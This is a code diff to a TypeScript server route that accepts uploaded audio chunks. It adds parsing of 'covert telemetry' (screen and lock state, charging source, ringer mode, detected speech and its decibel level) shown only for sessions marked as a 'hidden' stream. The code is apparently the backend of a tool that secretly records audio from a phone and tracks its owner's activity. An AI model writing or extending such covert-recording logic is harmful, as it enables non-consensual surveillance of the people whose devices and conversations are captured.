@@ -154,21 +154,62 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
             micInUse
         );
 
-        // Dynamically update device_info for Dashboard Session Lists (Battery & Audio Route)
-        const metaMatch = file.originalname.match(/_B(\d+)_S(\d+)(?:_O([A-Z]{3}))?/);
+        // Dynamically update device_info for Dashboard Session Lists (Covert Telemetry)
+        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?/);
         if (metaMatch) {
             const battery = metaMatch[1];
-            let routeStr = '';
-            if (metaMatch[3] === 'JCK') routeStr = ' | 🎧 Jack';
-            else if (metaMatch[3] === 'BLU') routeStr = ' | 🦷 Bluetooth';
-            else if (metaMatch[3] === 'SPK') routeStr = ' | 🔊 Speaker';
+            const routeCode = metaMatch[3];
+            const screenCode = metaMatch[4];
+            const unlockCode = metaMatch[5];
+            const powerCode = metaMatch[6];
+            const ringerCode = metaMatch[7];
+            const speechCode = metaMatch[8];
+            const dbVal = metaMatch[9];
 
             const session = db.getSession(session_id);
             if (session) {
-                // Strip old telemetry after the first "|" and append the latest
                 const baseInfo = session.device_info.split('|')[0].trim();
-                const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${routeStr}`;
-                db.updateSessionDeviceInfo(session_id, newDeviceInfo);
+
+                // Only show covert intelligence details if this is the covert "hidden" stream!
+                // Main stream sessions remain clean and basic.
+                if (session.stream_type === 'hidden') {
+                    let routeStr = '';
+                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
+                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
+                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';
+
+                    let powerStr = '';
+                    if (powerCode === 'CUSB') powerStr = ' (💻 PC USB)';
+                    else if (powerCode === 'CAC') powerStr = ' (⚡ Wall AC)';
+                    else if (powerCode === 'CWIR') powerStr = ' (🛜 Wireless)';
+
+                    let screenStr = '';
+                    if (screenCode === '1') {
+                        screenStr = unlockCode === '1' ? ' | 📱 Screen ON (Unlocked)' : ' | 📱 Screen ON (Locked)';
+                    } else if (screenCode === '0') {
+                        screenStr = ' | 🌑 Screen OFF';
+                    }
+
+                    let ringerStr = '';
+                    if (ringerCode === 'RS') ringerStr = ' | 🔇 Silent';
+                    else if (ringerCode === 'RV') ringerStr = ' | 📳 Vibrate';
+
+                    let audioStr = '';
+                    if (speechCode === '1') {
+                        audioStr = ` | 🗣️ Speech (${dbVal || 0}dB)`;
+                    }
+
+                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}`;
+                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
+                } else {
+                    // Standard / Main stream — keep simple
+                    let routeStr = '';
+                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
+                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
+                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';
+                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${routeStr}`;
+                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
+                }
             }
         }
 
